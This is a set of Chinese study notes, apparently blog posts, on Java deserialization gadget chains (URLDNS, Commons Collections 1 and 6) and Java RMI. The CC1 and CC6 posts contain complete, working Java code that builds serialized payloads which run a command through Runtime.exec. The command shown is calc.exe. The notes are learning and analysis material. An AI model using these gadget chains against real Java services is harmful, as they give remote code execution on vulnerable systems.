[{"id":"cc6f53e8dc634d13d7c94fb0decfd921","title":"Java反序列化3笔记","content":"\n\n参考资料：p牛 Java安全漫谈 12   Java反序列化6\nhttps://t.zsxq.com/05vVVfAeI\nCommon Collection6前面学习cc1的时候发现cc1有版本限制问题，所以这个阶段来解决版本限制问题，一种通用的反序列化链，也就是cc6\nAnnotationInvocationHandler类的readobject逻辑发生改变，无法在通过其调用LazyMap的get方法，而CC6链则发现一种新的可以调用LazyMap的get方法的类，通过TiedMapEntry类触发Lazy的get方法\norg.apache.commons.collections.keyvalue.TiedMapEntry在其getValue方法中直接返回map.get(key)，在此处调用了输入map的get方法\n\n同时该类里的hashCode方法又无条件的调用了getValue方法\n\n在前面的利用链里，hashmap的readobject方法调用了hash方法，而在hash方法里又调用了key的hashcode方法，所以这个利用链就完整了\n\n只需让hash方法的key为TiedMapEntry对象即可触发该类的hashcode方法\n将前面CC1链中获取的恶意LazyMap对象作为TiedMapEntry的map属性，实例化一个TiedMapEntry对象\nMap innerMap &#x3D; new HashMap();\n\nMap outerMap &#x3D; LazyMap.decorate(innerMap, transformerChain);\n\n&#x2F;&#x2F;通用链，使用TiedMapEntry\n\nTiedMapEntry tme &#x3D; new TiedMapEntry(outerMap, &quot;keykey&quot;);\n\n之后将其转化为hashmap对象的key\nMap expMap &#x3D; new HashMap();\n\nexpMap.put(tme, &quot;valuevalue&quot;);\n\n接着就能直接序列化和反序列化试试\n发现可以序列化但是无法弹出计算器\n原因在于反序列化时LazyMap的get方法进行了一个判断，当这个输入的key不存在这个map中时才会执行put操作，而调式发现这里输入的key为前面的keykey，这个keykey是存在于map中的，所以没有进入if判断\n还有一个原因是p牛的代码中没有直接将恶意回调放在Lazy里，而是先放一个不执行命令的回调，在put之后修改这个回调为恶意回调\n在将TiedMapEntry对象设置为hashmap的key时执行力put操作，而put方法里又调用了hash(key)，所以调式时是在这里就触发了利用链，在p牛的代码中，这时的回调并不是命令执行的回调，才会导致无法执行命令\n将其换成执行命令的回调是会导致命令执行，但是并不是我们需要的反序列化时的执行，而是直接在执行put操作时就执行了命令\n所以为了解决这个问题，需要在put之后将keykey值移除，在修改回调为恶意回调\n\n为了明显查看，所以直接在前面就将回调设置为执行命令的回调，调式发现弹出来两次计算机，一次是在put时就弹出，一次是在readobject时弹出，说明前面的分析没有问题\n这个代码真是缺一不可，真巧妙\n完整代码：package org.vulhub.sec;\n\nimport org.apache.commons.collections.Transformer;\nimport org.apache.commons.collections.functors.ChainedTransformer;\nimport org.apache.commons.collections.functors.ConstantTransformer;\nimport org.apache.commons.collections.functors.InvokerTransformer;\nimport org.apache.commons.collections.keyvalue.TiedMapEntry;\nimport org.apache.commons.collections.map.LazyMap;\n\nimport java.io.*;\nimport java.lang.reflect.Field;\nimport java.util.HashMap;\nimport java.util.Map;\n\npublic class CommonsCollections6 &#123;\n    public static void main(String[] args) throws Exception &#123;\n    \t&#x2F;&#x2F;防止本地调式在put时触发命令执行\n        Transformer[] fakeTransformers &#x3D; new Transformer[] &#123;new ConstantTransformer(1)&#125;;\n        Transformer[] transformers &#x3D; new Transformer[] &#123;\n                new ConstantTransformer(Runtime.class),\n                new InvokerTransformer(&quot;getMethod&quot;, new Class[] &#123; String.class,\n                        Class[].class &#125;, new Object[] &#123; &quot;getRuntime&quot;,\n                        new Class[0] &#125;),\n                new InvokerTransformer(&quot;invoke&quot;, new Class[] &#123; Object.class,\n                        Object[].class &#125;, new Object[] &#123; null, new Object[0] &#125;),\n                new InvokerTransformer(&quot;exec&quot;, new Class[] &#123; String.class &#125;,\n                        new String[] &#123; &quot;calc.exe&quot;&#125;),\n                new ConstantTransformer(1),\n        &#125;;\n        Transformer transformerChain &#x3D; new ChainedTransformer(fakeTransformers);\n\n        &#x2F;&#x2F; 不再使用原CommonsCollections6中的HashSet，直接使用HashMap\n        Map innerMap &#x3D; new HashMap();\n        Map outerMap &#x3D; LazyMap.decorate(innerMap, transformerChain);\n        &#x2F;&#x2F;通用链，使用TiedMapEntry\n        TiedMapEntry tme &#x3D; new TiedMapEntry(outerMap, &quot;keykey&quot;);\n\n        Map expMap &#x3D; new HashMap();\n        &#x2F;&#x2F;会触发一次利用链\n        expMap.put(tme, &quot;valuevalue&quot;);\n        &#x2F;&#x2F;移除掉以达到进入if判断，执行命令\n        outerMap.remove(&quot;keykey&quot;);\n\n        Field f &#x3D; ChainedTransformer.class.getDeclaredField(&quot;iTransformers&quot;);\n        f.setAccessible(true);\n        &#x2F;&#x2F;替换恶意transformer\n        f.set(transformerChain, transformers);\n\n        &#x2F;&#x2F; &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;\n        &#x2F;&#x2F; 生成序列化字符串\n        ByteArrayOutputStream barr &#x3D; new ByteArrayOutputStream();\n        ObjectOutputStream oos &#x3D; new ObjectOutputStream(barr);\n        oos.writeObject(expMap);\n        oos.close();\n\n        &#x2F;&#x2F; 本地测试触发\n        System.out.println(barr);\n        ObjectInputStream ois &#x3D; new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray()));\n        Object o &#x3D; (Object)ois.readObject();\n    &#125;\n&#125;\n\n","slug":"Java反序列化3笔记","date":"2022-09-11T09:54:16.000Z","categories_index":"Java安全","tags_index":"Java","author_index":"Longw"},{"id":"40de76659604bae52b4863ba88be567d","title":"Java反序列化2笔记","content":"参考资料：p牛 Java安全漫谈 9 10 11反序列化3 4 5：\nhttps://t.zsxq.com/05MzN7miq\nhttps://t.zsxq.com/05AAAEYVN\nhttps://t.zsxq.com/05VVRfAea\n前面了解了反序列化利用基础，和URLDNS利用链\n接下来学习，Common Collections 1 利用链\nCommon Collections 1环境：eclipse，下载3.1版本的Common Collections jar文件\nhttps://nowjava.com/jar/detail/m02261225/commons-collections-3.1.jar.html\n在build path的设置中添加该jar文件，之后选用并且应用它\n同时为了在eclipse中调试方便，还需要下载Common Collections sources jar包同时导入\n在修改打开源代码路径为Common Collections sources jar  就能够查看源代码了\n根据漫谈中的简化版cc1利用链demo代码，运行后能够成功弹出计算器\n原理：利用common collection 中的transfromer构造利用链\nTransformedMap用于修饰map，被修饰的map在使用put添加新元素时会执行一个回调\nMap outerMap &#x3D; TransformedMap.decorate(innerMap, keyTransformer, valueTransformer);  \n\n对innermap进行修饰，设置一个处理新元素key的回调和一个处理\n新元素value的回调，回调指的是实现transformer接口的类，之后返回修饰好的outerMap\nTransformer是一个接口，接口里面只有一个待实现方法\npublic interface Transformer &#123;\n\n\tpublic Object transform(Object input);\n\n&#125;  \n\nTransformedMap在转换Map新元素调用tansform方法，过程类似于调用回调函数，这个函数的参数是原始对象。\nConstantTransformer是实现Transformer接口的一个类，它的过程就是在构造函数的时候传入一个对象，在tansform方法将对象在返回\n public ConstantTransformer(Object constantToReturn) &#123;\n\n\t super(); \n     iConstant &#x3D; constantToReturn; \n\n&#125; \n\npublic Object transform(Object input) &#123;\n\n \treturn iConstant; \n\n&#125;  \n\n 所以他的作⽤其实就是包装任意⼀个对象，在执行回调时返回这个对象，进而方便后续操作。  \nInvokerTransformer是一个实现Transformer接口的类，可以用来执行任意方法，是反序列化能执行任意代码的关键\n实例化时需要传入三个参数，第一个是待执行的方法名，第二个是这个函数的参数列表的参数类型，第三个是传给这个函数的参数列表\npublic InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) &#123; \n\n\tsuper();\n\n\tiMethodName &#x3D; methodName; \n\n\tiParamTypes &#x3D; paramTypes; iArgs &#x3D; args; \n\n&#125;  \n\n后面回调Transform方法，执行input对象的iMethodName方法\npublic Object transform(Object input) &#123; \n\n\tif (input &#x3D;&#x3D; null) &#123; \n\n\t\treturn null; \n\n\t&#125;\n\n \ttry &#123; \n\n\t\tClass cls &#x3D; input.getClass(); \n\n\t\tMethod method &#x3D; cls.getMethod(iMethodName, iParamTypes); \n\n\t\treturn method.invoke(input, iArgs); \n\n\t&#125; catch (NoSuchMethodException ex) &#123; \n\n\t\tthrow new FunctorException(&quot;InvokerTransformer: The method &#39;&quot; + iMethodName + &quot;&#39; on &#39;&quot; \t\t\t\t+ \tinput.getClass() + &quot;&#39; does not exist&quot;);\n\n\t &#125; catch (IllegalAccessException ex) &#123;  \n\n \t\tthrow new FunctorException(&quot;InvokerTransformer: The method &#39;&quot; + iMethodName + &quot;&#39; on &#39;&quot; \t\t\t\t+ \tinput.getClass() + &quot;&#39; cannot be accessed&quot;); \n\n\t&#125; catch (InvocationTargetException ex) &#123; \n\n\t\tthrow new FunctorException(&quot;InvokerTransformer: The method &#39;&quot; + iMethodName + &quot;&#39; on &#39;&quot; \t\t\t \t+ \tinput.getClass() + &quot;&#39; threw an exception&quot;, ex); \n\n\t&#125; \n\n&#125;  \n\n\n\nChainedTransformer是一个实现Transformer接口的类，作用是将内部的Transformer串在一起。将前面一个回调的执行结果当作后一个回调的参数传入\npublic ChainedTransformer(Transformer[] transformers) &#123; \n\n\tsuper(); \n\n\tiTransformers &#x3D; transformers; \n\n&#125; \n\npublic Object transform(Object object) &#123; \n\n\tfor (int i &#x3D; 0; i &lt; iTransformers.length; i++) &#123; \n\n\t\tobject &#x3D; iTransformers[i].transform(object); \n\n\t&#125; \n    return object;\n\n &#125;  \n\n\n\nTransformedMap使用ChainedTransformer将ConstantTransformer和InvokerTransformer串联起来，其中ConstantTransformer获取当前环境的Runtime对象，InvokerTransformer执行Runtime对象的exec方法，参数是当前计算机程序的位置\n将其作为innermap的TransformerMap修饰\nMap innerMap &#x3D; new HashMap();\n\nMap outerMap &#x3D; TransformedMap.decorate(innerMap, null,transformerChain);\n\n这个修饰无论是当作key修饰还是value修饰，还是两个修饰都是，都只会触发一次弹出一次计算器\n前面说过，当这个修饰的map添加新元素时就会触发回调\nouterMap.put(&quot;test&quot;, &quot;xxxx&quot;);\n\n所以添加一个新元素，就会执行回调，获取Runtime对象，在执行exec方法调用计算器\n完整代码：package org.vulhub.sec;\nimport org.apache.commons.collections.Transformer;\nimport org.apache.commons.collections.functors.ChainedTransformer;\nimport org.apache.commons.collections.functors.ConstantTransformer;\nimport org.apache.commons.collections.functors.InvokerTransformer;\nimport org.apache.commons.collections.map.TransformedMap;\n\nimport java.util.HashMap;\nimport java.util.Map;\n\n\npublic class CommonCollections1 &#123;\n\t public static void main(String[] args) throws Exception &#123;\n\t\t Transformer[] transformers &#x3D; new Transformer[]&#123;\n\t\t\t\t new ConstantTransformer(Runtime.getRuntime()),\n\t\t\t\t new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;,\n\t\t\t\t\t\t new Object[]\n\t\t\t\t\t\t\t\t &#123;&quot;C:\\\\Windows\\\\SysWOW64\\\\calc.exe&quot;&#125;),\n\t\t &#125;;\n\t\t Transformer transformerChain &#x3D; new\n\t\t\t\t \tChainedTransformer(transformers);\n\t\t Map innerMap &#x3D; new HashMap();\n\t\t Map outerMap &#x3D; TransformedMap.decorate(innerMap, null,transformerChain);\n\t\t outerMap.put(&quot;test&quot;, &quot;xxxx&quot;);\n\n\n\t &#125;\n\t\n&#125;\n\n\n\n\n反序列化利用环境：小于jdk 8u71\n前面的demo只能在本地运行测试，而要真正利用则需要将其生成序列化数据\ndemo的核心是利用put操作，让其执行回调，实际反序列化时需要找到一个类其readObject方法里又类似于写入的操作\nsun.reflect.annotation.AnnotationInvocationHandler这个类的readObject方法，会遍历反序列化得到的map的所有元素，并将其依次设置值，在执行这个操作时，就会触发回调\n因为该类是jdk内部的类，不能直接实例化，所以通过反射调用它\nClass clazz &#x3D; Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);\n\nConstructor construct &#x3D; clazz.getDeclaredConstructor(Class.class, Map.class);\n\nconstruct.setAccessible(true);\n\nObject obj &#x3D; construct.newInstance(Retention.class, outerMap);\n\nAnnotationInvocationHandler类的构造函数有两个参数，第一个参数是一个Annotation类；第二个是参数就是前面构造的Map。  \n在反序列化测试时发现，Runtime报错，原因是Runtime类没有实现 java.io.Serializable  接口，所以需要将其改为通过反射调用，这个得到的是一个class对象，这个java.lang.class实现了java.io.Serializable接口就能正常序列化。\nTransformer[] transformers &#x3D; new Transformer[]&#123;\t\n\n\t\t\t\tnew ConstantTransformer(Runtime.class),\n\n\t\t\t\tnew InvokerTransformer(&quot;getMethod&quot;, new Class[] &#123; String.class,Class[].class&#125;, \t\t\t\t\t\t\t\t\t\t  new Object[] &#123;&quot;getRuntime&quot;,new Class[0] &#125;),\n\n\t\t\t\tnew InvokerTransformer(&quot;invoke&quot;, new Class[] &#123; Object.class,Object[].class &#125;, \n                                       new Object[] &#123; null, new Object[0] &#125;),\n\n\t\t\t\tnew InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;,\n\n\t\t\t\tnew String[] &#123;&quot;C:\\\\\\\\Windows\\\\\\\\SysWOW64\\\\\\\\calc.exe&quot;&#125;),\n\n&#125;;\n\n再次反序列化输出了反序列化数据，但是不能正常弹计算器\n这是由于AnnotationInvocationHandler类的readObject方法中有个if判断，只有当var7不为空时才会执行setValue操作，才能正常触发回调\n条件：\n\n sun.reflect.annotation.AnnotationInvocationHandler 构造函数的第一个参数必须是 Annotation的子类，且其中必须含有至少一个方法，假设方法名是X  \n 被 TransformedMap.decorate 修饰的Map中必须有一个键名为X的元素  \n\n所以前面使用了Retention.class，它有一个value方法，所以在innermap时，需要传入一个key为value的元素\ninner.put(&quot;value&quot;,&quot;xxx&quot;);\n\n这样就保证执行了setValue操作\n再运行就能成功弹出计算器，在小于jdk8u71的情况下。在大于等于8u71时无法弹出。\n大于8u71时无法弹出是因为修改了这个类的readObject方法，反序列化后得到的map不直接使用，而是新建一个LinkedHashMap对象，将原来的键值添加进去，后续对map的操作是基于这个LinkedHashMap对象，而这个对象并没有以前map的修饰，所以在对LinkedHashMap对象进行set和put时，也就无法触发原来map上的回调。\n完整代码：package org.vulhub.sec;\nimport org.apache.commons.collections.Transformer;\nimport org.apache.commons.collections.functors.ChainedTransformer;\nimport org.apache.commons.collections.functors.ConstantTransformer;\nimport org.apache.commons.collections.functors.InvokerTransformer;\nimport org.apache.commons.collections.map.LazyMap;\nimport org.apache.commons.collections.map.TransformedMap;\n\nimport java.io.ByteArrayInputStream;\nimport java.io.ByteArrayOutputStream;\nimport java.io.ObjectInputStream;\nimport java.io.ObjectOutputStream;\nimport java.lang.annotation.Retention;\nimport java.lang.reflect.Constructor;\nimport java.lang.reflect.InvocationHandler;\nimport java.lang.reflect.Proxy;\nimport java.util.HashMap;\nimport java.util.Map;\n\npublic class CommonCollections1next &#123;\n\tpublic static void main(String[] args) throws Exception &#123;\n\t\t\n\t\tTransformer[] transformers &#x3D; new Transformer[]&#123;\t\n\t\t\t\tnew ConstantTransformer(Runtime.class),\n\t\t\t\tnew InvokerTransformer(&quot;getMethod&quot;, new Class[] &#123; String.class,Class[].class&#125;, new Object[] &#123;&quot;getRuntime&quot;,new Class[0] &#125;),\n\t\t\t\tnew InvokerTransformer(&quot;invoke&quot;, new Class[] &#123; Object.class,Object[].class &#125;, new Object[] &#123; null, new Object[0] &#125;),\n\t\t\t\tnew InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;,\n\t\t\t\t\t\tnew String[]\n\t\t\t\t\t\t\t\t&#123;&quot;C:\\\\\\\\Windows\\\\\\\\SysWOW64\\\\\\\\calc.exe&quot;&#125;),\n\t\t&#125;;\n\t\tTransformer transformerChain &#x3D; new ChainedTransformer(transformers);\n\t\tMap innerMap &#x3D; new HashMap();\n\t\t\n\t\tinnerMap.put(&quot;value&quot;, &quot;xxxx&quot;);\n\t\tMap outerMap &#x3D; TransformedMap.decorate(innerMap, null,\n\t\t\t\ttransformerChain);\n\t\t\n\t\tClass clazz &#x3D; Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);\n\t\tConstructor construct &#x3D; clazz.getDeclaredConstructor(Class.class, Map.class);\n\t\tconstruct.setAccessible(true);\n\t\tObject obj &#x3D; construct.newInstance(Retention.class, outerMap);\n\t\t\t\t\n\t\tByteArrayOutputStream barr &#x3D; new ByteArrayOutputStream();\n\t\tObjectOutputStream oos &#x3D; new ObjectOutputStream(barr);\n\t\t\n\t\toos.writeObject(obj);\n\t\toos.close();\n\t\t\n\t\tSystem.out.println(barr);\n\t\tObjectInputStream ois &#x3D; new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray()));\n\t\t\n\t\tObject o &#x3D; (Object)ois.readObject();\t\t\t\n\t&#125;\n&#125;\n\n\n\nLazyMap环境：\n小于jdk8u71\n在yso中没有使用TransformedMap而是使用LazyMap，LazyMap与TransformedMap的不同点在于，LazyMap是通过get方法执行put操作，在执行get方法输入一个不存在的key值时会默认调用put方法，这样就能执行回调。\n而在AnnotationInvocationHandler类的invoke方法中正好有使用到get方法。\nyso中利用java对象代理 java.reflect.Proxy 来劫持AnnotationInvocationHandler的某个对象\nMap proxyMap &#x3D; (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), new Class[] \t\t\t&#123;Map.class&#125;, handler);  \n\n第一个参数使用默认，第二个参数是需要代理的对象集合，第三个参数是实现了InvocationHandler 接口的对象，里面有代理的逻辑。\nAnnotationInvocationHandler类就是一个InvocationHandler，所以对它进行代理，在readObject方法中只要调用了任意方法就会导致执行LazyMap的get方法。\nInvocationHandler handler &#x3D; (InvocationHandler)\n\t\t\t\tconstruct.newInstance(Retention.class, outerMap);\n\n Map proxyMap &#x3D; (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), new Class[] \t\n                                             &#123;Map.class&#125;, handler);  \n\n代理的对象是一个Map需要将其转化为AnnotationInvocationHandler，因为要执行的是AnnotationInvocationHandler的readObject方法。\nhandler &#x3D; (InvocationHandler) construct.newInstance(Retention.class,\n\t\t\tproxyMap);\n\n接下来就是正常的序列化和反序列化了\nyso中在transformer数组的最后还添加了一个 ConstantTransformer(1)，它的作用是隐藏程序运行爆出的进程启动信息。\n完整利用：package org.vulhub.sec;\nimport org.apache.commons.collections.Transformer;\nimport org.apache.commons.collections.functors.ChainedTransformer;\nimport org.apache.commons.collections.functors.ConstantTransformer;\nimport org.apache.commons.collections.functors.InvokerTransformer;\nimport org.apache.commons.collections.map.LazyMap;\nimport org.apache.commons.collections.map.TransformedMap;\n\nimport java.io.ByteArrayInputStream;\nimport java.io.ByteArrayOutputStream;\nimport java.io.ObjectInputStream;\nimport java.io.ObjectOutputStream;\nimport java.lang.annotation.Retention;\nimport java.lang.reflect.Constructor;\nimport java.lang.reflect.InvocationHandler;\nimport java.lang.reflect.Proxy;\nimport java.util.HashMap;\nimport java.util.Map;\npublic class CommonCollections1Lazy &#123;\n\tpublic static void main(String[] args) throws Exception &#123;\n\t\t\n\t\tTransformer[] transformers &#x3D; new Transformer[]&#123;\t\n\t\t\t\tnew ConstantTransformer(Runtime.class),\n\t\t\t\tnew InvokerTransformer(&quot;getMethod&quot;, new Class[] &#123; String.class,Class[].class&#125;, new Object[] &#123;&quot;getRuntime&quot;,new Class[0] &#125;),\n\t\t\t\tnew InvokerTransformer(&quot;invoke&quot;, new Class[] &#123; Object.class,Object[].class &#125;, new Object[] &#123; null, new Object[0] &#125;),\n\t\t\t\tnew InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;,\n\t\t\t\t\t\tnew String[]\n\t\t\t\t\t\t\t\t&#123;&quot;C:\\\\\\\\Windows\\\\\\\\SysWOW64\\\\\\\\calc.exe&quot;&#125;),\n                new ConstantTransformer(1),\n\t\t&#125;;\n\t\tTransformer transformerChain &#x3D; new ChainedTransformer(transformers);\n\t\tMap innerMap &#x3D; new HashMap();\n\t\t\n\t\tMap outerMap &#x3D; LazyMap.decorate(innerMap, transformerChain);\n\t\t\n\t\tClass clazz &#x3D; Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);\n\t\tConstructor construct &#x3D; clazz.getDeclaredConstructor(Class.class, Map.class);\n\t\tconstruct.setAccessible(true);\n\t\t\n\t\tInvocationHandler handler &#x3D; (InvocationHandler)\n\t\t\t\tconstruct.newInstance(Retention.class, outerMap);\n\t\t&#x2F;&#x2F;进行proxy\n\t\tMap proxyMap &#x3D; (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), new\n\t\t\t\tClass[] &#123;Map.class&#125;, handler);\n\t\t&#x2F;&#x2F;用AnnotationInvocationHandler对这个proxyMap进行包裹\n\t\thandler &#x3D; (InvocationHandler) construct.newInstance(Retention.class,\n\t\t\t\tproxyMap);\n\n\t\t\t\t\n\t\tByteArrayOutputStream barr &#x3D; new ByteArrayOutputStream();\n\t\tObjectOutputStream oos &#x3D; new ObjectOutputStream(barr);\n\t\t\n\t\toos.writeObject(handler);\n\t\toos.close();\n\t\t\n\t\tSystem.out.println(barr);\n\t\tObjectInputStream ois &#x3D; new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray()));\n\t\t\n\t\tObject o &#x3D; (Object)ois.readObject();\n\t\t\n\t\t\n\t&#125;\n&#125;\n\n\n\n","slug":"Java反序列化2笔记","date":"2022-09-05T11:58:43.000Z","categories_index":"Java安全","tags_index":"Java","author_index":"Longw"},{"id":"ef40a0cd7170df96b7fe2fe93ccaa11e","title":"Java反序列化1笔记","content":"参考资料：p牛 Java安全漫谈7 8  反序列化1 2\nhttps://t.zsxq.com/05QrVnMBy\nhttps://t.zsxq.com/053zvFeAu\nJava反序列化利用基础在Java 中，主要是通过\nwriteobject写入序列化数据到stream\n并将\n序列化输入的数据保存到 Annotation  中\n通过\nreadobject读取写入到stream的序列化数据将其反序列化执行\nURLDNS反序列化利用链（gadget） ysoserial的URLDNS类，通过getobject方法获取payload，getobject方法将会返回被序列化的对象，这个对象在这条链里是hashmap\n通过hashmap类的readobject方法触发反序列化\n在hashmap的readobject方法中会执行hash方法\nputVal(*hash*(key), key, value, false, false);\n\n这个hash方法直接使用的在hashmap中\nreturn (key &#x3D;&#x3D; null) ? 0 : (h &#x3D; key.hashCode()) ^ (h &gt;&gt;&gt; 16);\n\nhash方法又调用了hashcode方法，这次调用是通过key调用的\n这个key是yso实例化的一个url对象，所以查看url中的hashcode方法\nif (hashCode !&#x3D; -1)\n    return hashCode;\n\nhashCode &#x3D; handler.hashCode(this);\nreturn hashCode;\n\n序列化时设置了\nReflections.*setFieldValue*(u, &quot;hashCode&quot;, -1); &#x2F;&#x2F; During the put above, the URL&#39;s hashCode is calculated and cached. This resets that so the next time hashCode is called a DNS lookup will be triggered.\n\n这个url对象的hashcode初始值为-1，就会调用handler的hashcode方法\n这个handler是URLStreamHandler对象的某个子类对象  （这个不知道代码在哪里写了）可能是这个\nstatic Hashtable&lt;String,URLStreamHandler&gt; *handlers* &#x3D; new Hashtable&lt;&gt;();\n\nURLStreamHandler是抽象类，所以只能实例化继承的子类\n在hashtable中没有重载或是覆写那么调用的这个方法就是在URLStreamHandler这个类中存在的该方法\nInetAddress addr &#x3D; getHostAddress(u);\n\n调用了getHostAddress方法，这个方法\nreturn u.getHostAddress();\n\n又调用了u也就是key的getHostAddress方法，在url类中\nhostAddress &#x3D; InetAddress.*getByName*(host);\n\n这个getHostAddress方法又调用InetAddress的getByName方法\n这个getByName方法的实现，是调用了getByAllName方法，作用是根据主机名，获取其IP地址，也就是发出一次DNS请求\n在yso中为了防止发出生成payload的时候也发出url请求和DNS查询，就重写了URLStreamHandler中的SilentURLStreamHandler类。\n整个流程：URLDNS—-&gt;HashMap.readobject()\nHashMap.readobject()—-&gt;HashMap.hash()\nHashMap.hash()—-&gt;URL.hashcode()\nURL.hashcode()—-&gt;URLStreamHandler.hashcode()\nURLStreamHandler.hashcode()—-&gt;URLStreamHandler.getHostAddress()\nURLStreamHandler.getHostAddress()—-&gt;URL.getHostAddress()\nURL.getHostAddress()—-&gt;InetAddress.getByName()\n上面的URLStreamHandler.getHostAddress()是一个重载方法，可以和URL.getHostAddress()一起当作是一个函数的调用\n星球问题解答：会上树的猪：\np师傅，关于这个链有一个小问题想请教。就是在对URL进行反序列化的时候不会调用构造方法了，那反序列化之后的handler属性是在哪一步被赋值的，我debug了一下URL类的readObject方法，只看到有一个调用了getURLStreamHandler()方法，是和handler属性有关的。就是这个handler的生成不是很明白，望师傅答疑\ncc：\n最近也在学Java反序列化，这个问题在分析的时候也困扰着我。后面经过分析发现。在URL类中还有一个方法是readResolve。在readResolve方法中会调用fabricateNewURL方法中new URL实例返回。在new URL(urlString);中会对handler进行赋值：this.handler = handler。并且在反序列化的时候会自动调用readResolve方法。注：可下断点在invokeReadResolve方法上，内部通过反射调用了readResolve。 readResolve作用，其方法的返回值为一个Object对象，该方法返回的对象将会代替反序列化的结果，直接将其作为反序列化的结果返回给上层调用ObjectInputStream对象readObject方法的结果。 分析过后感觉这个readResolve也是一个可利用的点，与readObject一样会自动调用。应该也可以通过readResolve作为入口的链。不过目前没有看到有链利用到了这一个，所以也不知道自己分析的对不对，求大家解答。\n","slug":"Java反序列化1笔记","date":"2022-09-05T11:53:13.000Z","categories_index":"Java安全","tags_index":"Java","author_index":"Longw"},{"id":"fb61931117f747252b543f33903e3e6d","title":"Java RMI笔记","content":"参考资料：廖雪峰老师 Java教程 RMI\nhttps://www.liaoxuefeng.com/wiki/1252599548343744/1323711850348577\np牛  Java安全漫谈456 RMI \nhttps://t.zsxq.com/052Nj62Jq\nhttps://t.zsxq.com/057qNvJ6I\nhttps://t.zsxq.com/05j2fM7iE\nseebug文章\nhttps://paper.seebug.org/1091/\nJava各种协议分析\nhttps://i.blackhat.com/eu-19/Wednesday/eu-19-An-Far-Sides-Of-Java-Remote-Protocols.pdf\n原理：客户端远程调用服务端代码，在服务端执行改代码，并返回结果给客户端\n整个过程由RMI底层负责实现序列化和反序列化\n要实现RMI，服务器和客户端必须共享同一个接口。\nJava的RMI规定此接口必须派生自java.rmi.Remote，并在每个方法声明抛出RemoteException。\nJava的RMI严重依赖序列化和反序列化，而这种情况下可能会造成严重的安全漏洞，因为Java的序列化和反序列化不但涉及到数据，还涉及到二进制的字节码，即使使用白名单机制也很难保证100%排除恶意构造的字节码。因此，使用RMI时，双方必须是内网互相信任的机器，不要把1099端口暴露在公网上作为对外服务。\n此外，Java的RMI调用机制决定了双方必须是Java程序，其他语言很难调用Java的RMI。如果要使用不同语言进行RPC调用，可以选择更通用的协议，例如gRPC。\nRMI Registry    提供注册，并将其绑定到RMI Server的对象上\nRMI Server    提供远程服务，里面有各种方法，有返回结果\nRMI Client     连接Registry，之后调用Server上的方法，获取返回结果\n简单RMI：服务端：package com.rmitest;\n\nimport java.rmi.Naming;\nimport java.rmi.Remote;\nimport java.rmi.RemoteException;\nimport java.rmi.registry.LocateRegistry;\nimport java.rmi.registry.Registry;\nimport java.rmi.server.UnicastRemoteObject;\n\n&#x2F;&#x2F;RMI服务创建后，将在后台开启监听线程，代码中并没有停止线程，\n&#x2F;&#x2F;所以需要使用资源管理器，搜索线程pid去停止该线程\npublic class RMIServer &#123;\n\t&#x2F;&#x2F;RMIServer端分为三个部分\n\t&#x2F;&#x2F;⼀个继承了 java.rmi.Remote 的接⼝，其中定义我们要远程调⽤的函数，⽐如这⾥的 hello()\n\tpublic interface IRemoteHelloWorld extends Remote &#123;\n\t\t public String hello() throws RemoteException;\n\t&#125;\n\t\t&#x2F;&#x2F;⼀个实现了此接⼝的类\n\tpublic class RemoteHelloWorld extends UnicastRemoteObject implements\n\t\tIRemoteHelloWorld &#123;\n\t\t protected RemoteHelloWorld() throws RemoteException &#123;\n\t\t\t super();\n\t\t \t&#125;\n\t\t \n\t\t public String hello() throws RemoteException &#123;\n\t\t\t System.out.println(&quot;call from&quot;);\n\t\t\t return &quot;Hello world&quot;;\n\t\t \t&#125;\n\t&#125;\n\t\t \n\tprivate void start() throws Exception &#123;\n\t\t&#x2F;&#x2F;用来创建Registry，\n\t\t&#x2F;&#x2F;并将上面的类实例化后绑定到⼀个地址。\n\t\t &#x2F;&#x2F;这就是我们所谓的Server了。s\n\t\tRemoteHelloWorld h &#x3D; new RemoteHelloWorld();\n\t\tLocateRegistry.createRegistry(1099);\n\t\tNaming.rebind(&quot;rmi:&#x2F;&#x2F;127.0.0.1:1099&#x2F;Hello&quot;, h);\n\t&#125;\n\t\n\t&#x2F;&#x2F;实例化RMIServer类，并执行start方法\n\tpublic static void main(String[] args) throws Exception &#123;\n\t\t\t new RMIServer().start();\n\t&#125;\n\t\n&#125;\n\n客户端：package com.rmitest;\n\nimport com.rmitest.RMIServer;\nimport java.rmi.Naming;\nimport java.rmi.NotBoundException;\nimport java.rmi.RemoteException;\n\npublic class RMIClient &#123;\n\n\tpublic static void main(String[] args) throws Exception &#123;\n\t\t RMIServer.IRemoteHelloWorld hello &#x3D; \n\t\t\t\t (RMIServer.IRemoteHelloWorld)Naming.lookup(&quot;rmi:&#x2F;&#x2F;192.168.0.107:1099&#x2F;Hello&quot;);\n\t\t String ret &#x3D; hello.hello();\n\t\t System.out.println(ret);\n\t&#125;\n\n\n&#125;\n\n\n\n利用： 1. 如果我们能访问RMI Registry服务，如何对其攻击？\n 2. 如果我们控制了目标RMI客户端中 Naming.lookup 的第一个参数（也就是RMI Registry的地 址），能不能进行攻击？  \n首先测试RMI Registry 的远程调用，发现RMI Registry  只允许本地调用rebind、bind、unbind方法，远程调用允许list、lookup方法\nlist方法能获取服务端所有绑定的对象列表\nlookup则是能获取服务端某个对象\nlookup让我们能够调用服务端上存在的危险方法\nhttps://github.com/NickstaDB/BaRMIe  该项目可以测试RMI上存在的危险方法\nApplet codebase任意代码执行要求：\n 安装并配置了SecurityManager  \nJava版本低于7u21、6u45，或者设置了 java.rmi.server.useCodebaseOnly=false  